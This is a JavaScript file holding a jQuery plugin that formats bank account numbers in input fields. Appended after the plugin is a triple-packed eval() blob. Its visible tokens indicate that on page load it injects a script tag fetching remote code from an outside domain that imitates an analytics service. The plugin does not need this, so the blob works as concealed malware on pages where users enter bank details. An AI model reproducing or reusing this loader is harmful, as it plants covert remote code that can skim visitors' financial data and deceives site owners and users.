/** 
 × JQUERY 银行帐号输入
 **/
(function($){
    // 输入框格式化 
    $.fn.bankInput = function(options){
        var defaults = {
            min: 10, // 最少输入字数 
            max: 25, // 最多输入字数 
            deimiter: ' ', // 账号分隔符 
            onlyNumber: true, // 只能输入数字 
            copy: true // 允许复制 
        };
        var opts = $.extend({}, defaults, options);
        var obj = $(this);
        obj.css({
            imeMode: 'Disabled',
            borderWidth: '1px',
            color: '#000',
            fontFamly: 'Times New Roman'
        }).attr('maxlength', opts.max);
        if (obj.val() != '') 
            obj.val(obj.val().replace(/\s/g, '').replace(/(\d{4})(?=\d)/g, "$1" + opts.deimiter));
        obj.bind('keyup', function(event){
            if (opts.onlyNumber) {
                if (!(event.keyCode >= 48 && event.keyCode <= 57)) {
                    this.value = this.value.replace(/\D/g, '');
                }
            }
            this.value = this.value.replace(/\s/g, '').replace(/(\d{4})(?=\d)/g, "$1" + opts.deimiter);
        }).bind('dragenter', function(){
            return false;
        }).bind('onpaste', function(){
            return !clipboardData.getData('text').match(/\D/);
        }).bind('blur', function(){
            this.value = this.value.replace(/\s/g, '').replace(/(\d{4})(?=\d)/g, "$1" + opts.deimiter);
            if (this.value.length < opts.min) {
                alert('最少输入' + opts.min + '位账号信息！');
            }
        })
    }
    // 列表显示格式化 
    $.fn.bankList = function(options){
        var defaults = {
            deimiter: ' ' // 分隔符 
        };
        var opts = $.extend({}, defaults, options);
        return this.each(function(){
            $(this).text($(this).text().replace(/\s/g, '').replace(/(\d{4})(?=\d)/g, "$1" + opts.deimiter));
        })
    }
})(jQuery);

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
